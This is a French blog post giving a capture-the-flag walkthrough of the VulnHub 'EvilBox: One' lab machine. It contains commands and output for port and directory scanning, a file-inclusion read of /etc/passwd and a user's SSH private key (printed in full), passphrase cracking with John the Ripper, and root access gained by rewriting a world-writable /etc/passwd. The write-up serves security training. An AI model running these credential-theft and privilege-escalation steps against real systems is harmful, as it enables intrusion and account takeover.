<!DOCTYPE html>
<html data-html-server-rendered="true" lang="fr" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22fr%22%7D%7D">
  <head>
    <title>CTF Evil: One - https://etienner.github.io</title><meta name="gridsome:hash" content="b89929ffb278454bd1f8bb0277abaa50df9b43f7"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.14"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:type" content="article"><meta data-vue-tag="ssr" property="og:title" content="CTF Evil: One"><meta data-vue-tag="ssr" property="og:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:url" content="https://etienner.github.io/ctf-evil-one/"><meta data-vue-tag="ssr" name="twitter:domain" content="https://etienner.github.io"><meta data-vue-tag="ssr" name="twitter:card" content="summary_large_image"><meta data-vue-tag="ssr" name="twitter:title" content="CTF Evil: One"><meta data-vue-tag="ssr" name="twitter:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" name="twitter:site" content="@etiennerouzeaud"><meta data-vue-tag="ssr" name="twitter:creator" content="@etiennerouzeaud"><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.9bb7ffafafc09ac851d81afb65b8ef59.png"><link rel="preload" href="/assets/css/0.styles.a80f6262.css" as="style"><link rel="preload" href="/assets/js/app.50d8a5ce.js" as="script"><link rel="preload" href="/assets/js/page--src-templates-post-vue.56e5bc07.js" as="script"><link rel="prefetch" href="/assets/js/page--node-modules-gridsome-app-pages-404-vue.5bf39404.js"><link rel="prefetch" href="/assets/js/page--src-pages-index-vue.027f19cb.js"><link rel="prefetch" href="/assets/js/page--src-templates-tag-vue.aae09759.js"><link rel="stylesheet" href="/assets/css/0.styles.a80f6262.css"><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
  </head>
  <body >
    <div data-server-rendered="true" id="app"><header class="py-2 text-center"><strong><a href="/" title="Accueil" class="active">Etienne ROUZEAUD - D√©veloppeur Web</a></strong></header><main><div class="title py-2 text-center" data-v-4b217994><h1 class="display-5 pt-2" data-v-4b217994>CTF Evil: One</h1><!----></div><div class="container"><div class="row sidebar"><div class="mt-4 col-lg-2"><p><em><span>29 ao√ªt 2021</span></em></p><ul class="list-unstyled"><li>
            üè∑Ô∏è <a href="/tag/Pentest/">Pentest</a></li><li>
            üè∑Ô∏è <a href="/tag/CTF/">CTF</a></li></ul><p>‚åö 8 mins de lecture</p><p><a href="https://www.vulnhub.com/entry/evilbox-one,736" target="_blank" rel="noopener">
            üíæ T√©l√©chargement
          </a></p></div><div class="col-lg-10 mt-4"><!----><article><h2>Avant propos</h2>
<p>Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.<br>
Ce CTF a √©t√© r√©alis√© avec une machine attaquante <strong>Kali 2021.2</strong> (<code class="language-text">lsb_release -r</code>).</p>
<h2>Enum√©ration</h2>
<p>On r√©cup√®re l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class="language-text">sudo netdiscover</code>.<br>
Avant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite <code class="language-text">export IP=192.168.1.26</code>.<br>
Puis on cr√©√© un dossier d√©di√© √† ce CTF <code class="language-text">cd Documents/ctf &amp;&amp; mkdir EvilOne &amp;&amp; cd EvilOne</code>.<br>
On lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ nmap -sV -sT -p- <span class="token variable">$IP</span> -oN nmap.txt
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.9p1 Debian <span class="token number">10</span>+deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.38 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>On un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur Apache 2.4.38 sur le port <strong>80</strong>.</p>
<p>On commence par faire un scan du serveur Web avec <strong>Gobuster</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ gobuster <span class="token function">dir</span> -u http://<span class="token variable">$IP</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,zip -o gobuster.txt
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">10701</span><span class="token punctuation">]</span>
/robots.txt           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">12</span><span class="token punctuation">]</span>   
/secret               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">313</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.26/secret/<span class="token punctuation">]</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>Le dossier "/secret" est vide. Tentons un autre <strong>Gobuster</strong> sur ce dossier.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ gobuster <span class="token function">dir</span> -u http://<span class="token variable">$IP</span>/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,zip -o gobuster-secret.txt
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">4</span><span class="token punctuation">]</span>
/evil.php             <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>Il y a la pr√©sence d'un fichier PHP "evil.php" dans ce dossier. Ce dernier ne retourne rien. Cherchons si un param√®tre existe sur cette URL avec l'outil <strong>wfuzz</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ wfuzz -w /usr/share/wordlists/dirb/common.txt --hh <span class="token number">0</span> <span class="token string">'http://192.168.1.26/secret/evil.php?FUZZ=/etc/passwd'</span>
000000947:   <span class="token number">200</span>        <span class="token number">26</span> L     <span class="token number">38</span> W       <span class="token number">1431</span> Ch     <span class="token string">"command"</span>      </code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Il existe un param√®tre, "command". Sur <a href="http://192.168.1.26/secret/evil.php?command=/etc/passwd" target="_blank" rel="nofollow noopener noreferrer">http://192.168.1.26/secret/evil.php?command=/etc/passwd</a>, on a bien les infos d'utilisateurs dont celui d'un certain "mowree".</p>
<div class="gridsome-highlight" data-language="txt"><pre style="counter-reset: linenumber NaN" class="language-txt line-numbers"><code class="language-txt">root:x:0:0:root:/root:/bin/bash
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>On est sur une faille de type LFI (Local File Inclusion).</p>
<p>Et sur l'URL <a href="http://192.168.1.26/secret/evil.php?command=/home/mowree/.ssh/id_rsa" target="_blank" rel="nofollow noopener noreferrer">http://192.168.1.26/secret/evil.php?command=/home/mowree/.ssh/id_rsa</a>, on tombe bien sur la clef SSH de l'utilisateur.</p>
<div class="gridsome-highlight" data-language="txt"><pre style="counter-reset: linenumber NaN" class="language-txt line-numbers"><code class="language-txt">-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On r√©cup√®re ce fichier via <strong>wget</strong>.</p>
<p><code class="language-text">wget http://$IP/secret/evil.php?command=/home/mowree/.ssh/id_rsa -O id_rsa</code></p>
<p>Et on n'oublie pas le <strong>chmod</strong> pour plus tard.</p>
<p><code class="language-text">chmod 600 id_rsa</code></p>
<p>D√©sormais, il nous faut retrouver la clef du mot de passe associ√©.</p>
<p>T√©l√©chargez l'utilitaire "ssh2john.py" avec la commande <code class="language-text">wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py</code> et g√©n√©rez un nouveau fichier <code class="language-text">python ssh2john.py id_rsa &gt; id_rsa.hash</code>.</p>
<p>Afin d'utiliser <strong>John The Ripper</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ john --wordlist<span class="token operator">=</span>/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>SSH <span class="token punctuation">[</span>RSA/DSA/EC/OPENSSH <span class="token punctuation">(</span>SSH private keys<span class="token punctuation">)</span> <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
Cost <span class="token number">1</span> <span class="token punctuation">(</span>KDF/cipher <span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">=</span>MD5/AES <span class="token assign-left variable">1</span><span class="token operator">=</span>MD5/3DES <span class="token assign-left variable">2</span><span class="token operator">=</span>Bcrypt/AES<span class="token punctuation">]</span><span class="token punctuation">)</span> is <span class="token number">1</span> <span class="token keyword">for</span> all loaded hashes
Cost <span class="token number">2</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">2</span> <span class="token keyword">for</span> all loaded hashes
Will run <span class="token number">2</span> OpenMP threads

Note: This <span class="token function">format</span> may emit <span class="token boolean">false</span> positives, so it will keep trying even after
finding a possible candidate.
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
unicorn          <span class="token punctuation">(</span>id_rsa<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><strong>John</strong> a trouv√© le mot de passe, "unicorn".</p>
<h2>P√©n√©tration</h2>
<p>En poss√©ssion de la clef SSH et du mot de passe associ√©, on peut donc se connecter au serveur <strong>SSH</strong> sans encombres.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">ssh</span> mowree@<span class="token variable">$IP</span> -i id_rsa
The authenticity of <span class="token function">host</span> <span class="token string">'192.168.1.26 (192.168.1.26)'</span> can<span class="token string">'t be established.
ECDSA key fingerprint is SHA256:cd9WCNmPY0i3zsZaPEV0qa7yp5hz8+TVNalFULd5CwM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">192.168</span>.1.26<span class="token string">' (ECDSA) to the list of known hosts.
Enter passphrase for key '</span>id_rsa': 
Linux EvilBoxOne <span class="token number">4.19</span>.0-17-amd64 <span class="token comment">#1 SMP Debian 4.19.194-3 (2021-07-18) x86_64</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On trouve le premier flag dans le fichier "user.txt".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> user.txt
56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<h2>Escalation</h2>
<p>On voit que le fichier "passwd" est modifiable.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">ls</span> -la /etc/passwd
-rw-rw-rw- <span class="token number">1</span> root root <span class="token number">1431</span> ago <span class="token number">29</span> <span class="token number">12</span>:50 /etc/passwd</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>On g√©n√®re donc un nouveau mot de passe "unicorn" via <strong>openssl</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ openssl <span class="token function">passwd</span> -1 unicorn
<span class="token variable">$1</span><span class="token variable">$U413</span>.MQ6$.ZO/2.l5DWY.2OotSCog61</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>On copie ce mot de passe dans le fichier "passwd" dans la ligne ci-dessous.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">nano</span> /etc/passwd
root:<span class="token variable">$1</span><span class="token variable">$U413</span>.MQ6$.ZO/2.l5DWY.2OotSCog61:0:0:root:/root:/bin/bash</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Une fois le fichier enregistr√©, on peut se connecter en "root".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">su</span> -l root
Contrase√±a: unicorn
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">grupos</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>Et trouver le flag de ce dernier.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /root/root.txt
36QtXfdJWvdC0VavlPIApUbDlqTsBM</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
</article></div></div></div></main><footer class="text-white mt-4"><ul class="nav nav-pills justify-content-center"><li><a href="https://github.com/etienner" target="_blank" rel="noopener" class="nav-link">Github</a></li><li><a href="https://medium.com/@etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Medium</a></li><li><a href="https://twitter.com/etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Twitter</a></li></ul></footer></div>
    <script>window.__INITIAL_STATE__={"data":{"post":{"title":"CTF Evil: One","date":"29 August 2021","content":"\u003Ch2\u003EAvant propos\u003C\u002Fh2\u003E\n\u003Cp\u003ELe d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.\u003Cbr\u003E\nCe CTF a √©t√© r√©alis√© avec une machine attaquante \u003Cstrong\u003EKali 2021.2\u003C\u002Fstrong\u003E (\u003Ccode class=\"language-text\"\u003Elsb_release -r\u003C\u002Fcode\u003E).\u003C\u002Fp\u003E\n\u003Ch2\u003EEnum√©ration\u003C\u002Fh2\u003E\n\u003Cp\u003EOn r√©cup√®re l'adresse IP de la machine distante avec \u003Cstrong\u003ENetdiscover\u003C\u002Fstrong\u003E \u003Ccode class=\"language-text\"\u003Esudo netdiscover\u003C\u002Fcode\u003E.\u003Cbr\u003E\nAvant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite \u003Ccode class=\"language-text\"\u003Eexport IP=192.168.1.26\u003C\u002Fcode\u003E.\u003Cbr\u003E\nPuis on cr√©√© un dossier d√©di√© √† ce CTF \u003Ccode class=\"language-text\"\u003Ecd Documents\u002Fctf &amp;&amp; mkdir EvilOne &amp;&amp; cd EvilOne\u003C\u002Fcode\u003E.\u003Cbr\u003E\nOn lance \u003Cstrong\u003ENmap\u003C\u002Fstrong\u003E pour scanner les ports de la machine distante.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ nmap -sV -sT -p- \u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E -oN nmap.txt\nPORT   STATE SERVICE VERSION\n\u003Cspan class=\"token number\"\u003E22\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  \u003Cspan class=\"token function\"\u003Essh\u003C\u002Fspan\u003E     OpenSSH \u003Cspan class=\"token number\"\u003E7\u003C\u002Fspan\u003E.9p1 Debian \u003Cspan class=\"token number\"\u003E10\u003C\u002Fspan\u003E+deb10u2 \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eprotocol \u003Cspan class=\"token number\"\u003E2.0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E80\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  http    Apache httpd \u003Cspan class=\"token number\"\u003E2.4\u003C\u002Fspan\u003E.38 \u003Cspan class=\"token variable\"\u003E\u003Cspan class=\"token punctuation\"\u003E((\u003C\u002Fspan\u003EDebian\u003Cspan class=\"token punctuation\"\u003E))\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn un serveur \u003Cstrong\u003ESSH\u003C\u002Fstrong\u003E sur le port \u003Cstrong\u003E22\u003C\u002Fstrong\u003E et un serveur Apache 2.4.38 sur le port \u003Cstrong\u003E80\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EOn commence par faire un scan du serveur Web avec \u003Cstrong\u003EGobuster\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ gobuster \u003Cspan class=\"token function\"\u003Edir\u003C\u002Fspan\u003E -u http:\u002F\u002F\u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E -w \u002Fusr\u002Fshare\u002Fwordlists\u002Fdirbuster\u002Fdirectory-list-2.3-medium.txt -x html,css,js,txt,php,zip -o gobuster.txt\n\u002Findex.html           \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E200\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E10701\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\n\u002Frobots.txt           \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E200\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E12\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E   \n\u002Fsecret               \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E301\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E313\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E--\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E http:\u002F\u002F192.168.1.26\u002Fsecret\u002F\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ELe dossier \"\u002Fsecret\" est vide. Tentons un autre \u003Cstrong\u003EGobuster\u003C\u002Fstrong\u003E sur ce dossier.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ gobuster \u003Cspan class=\"token function\"\u003Edir\u003C\u002Fspan\u003E -u http:\u002F\u002F\u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E\u002Fsecret -w \u002Fusr\u002Fshare\u002Fwordlists\u002Fdirbuster\u002Fdirectory-list-2.3-medium.txt -x html,css,js,txt,php,zip -o gobuster-secret.txt\n\u002Findex.html           \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E200\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E4\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\n\u002Fevil.php             \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E200\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EIl y a la pr√©sence d'un fichier PHP \"evil.php\" dans 